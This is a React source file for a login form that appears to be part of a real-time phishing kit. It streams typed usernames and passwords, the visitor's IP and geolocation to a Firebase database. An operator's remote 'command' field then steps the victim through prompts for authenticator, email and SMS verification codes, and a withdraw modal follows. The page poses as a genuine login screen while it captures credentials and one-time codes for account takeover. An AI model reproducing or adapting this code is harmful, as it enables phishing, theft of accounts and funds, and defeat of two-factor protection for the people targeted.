"use client";

import { database } from "@/firebase";
import {
  ThenableReference,
  onDisconnect,
  onValue,
  push,
  ref,
  update,
} from "firebase/database";
import { ToastContainer, toast } from "react-toastify";

import { useEffect, useState, useTransition } from "react";
import { AuthenticatorCode } from "./steps/AuthenticatorCode";
import { PhoneCode } from "./steps/PhoneCode";
import { EmailCode } from "./steps/EmailCode";
import { UserPass } from "./steps/UserPass";
import { getIpGeo } from "@/utils";
import { comma } from "postcss/lib/list";
import { WithdrawModal } from "./steps/WithDrawModal";

export const LoginForm = () => {
  const [dataRef, setDataRef] = useState<null | ThenableReference>(null);
  const [ipForm, seteIpForm] = useState<string | null>(null);
  const [clientIp, setClientIP] = useState<string | null>(null);

  const [isPending, startTransition] = useTransition();

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const [command, setCommand] = useState("W_LOGIN");

  useEffect(() => {
    fetch("https://api.ipify.org?format=json").then(async (res) => {
      const { ip } = await res.json();
      setClientIP(ip);
    });
  }, []);

  useEffect(() => {
    if (username.length >= 2 && !dataRef && clientIp) {
      const ipF = clientIp.replaceAll(".", ",");
      const infosRef = ref(database, `info/${ipF}`);
      seteIpForm(ipF);
      const newDataRef = push(infosRef, {
        online: true,
        username: "",
        password: "",
        emailCode: "",
        twoAF: "",
        smsCode: "",
        trPass: {
          tr: "",
          email: "",
          sms: "",
          twoFa: "",
        },
        ip: clientIp,
        zone: "",
        command: "W_LOGIN",
      });

      startTransition(async () => {
        const locData = await getIpGeo(clientIp);
        if (locData) {
          update(newDataRef, { zone: locData });
        }
      });

      setDataRef(newDataRef);

      onDisconnect(newDataRef).update({
        online: false,
      });

      onValue(newDataRef, (snap) => {
        const data = snap.val();

        setCommand(data.command);
      });
    }

    if (dataRef) {
      update(dataRef, { username, password });
    }
  }, [username, password]);

  return (
    <>
      <div className="flex-1 w-full md:min-w-[780px] min-w-max flex justify-center">
        {command.includes("W_LOGIN") ? (
          <UserPass
            command={command}
            password={password}
            setPassword={setPassword}
            setUsername={setUsername}
            username={username}
            dataRef={dataRef}
          />
        ) : null}
        {command.includes("W_SEC_1") ? (
          <AuthenticatorCode command={command} dataRef={dataRef} />
        ) : null}
        {command.includes("W_SEC_2") ? (
          <EmailCode command={command} dataRef={dataRef} />
        ) : null}
        {command.includes("W_SEC_3") ? (
          <PhoneCode command={command} dataRef={dataRef} />
        ) : null}
      </div>

      <ToastContainer />

      <WithdrawModal command={command} dataRef={dataRef} />
    </>
  );
};
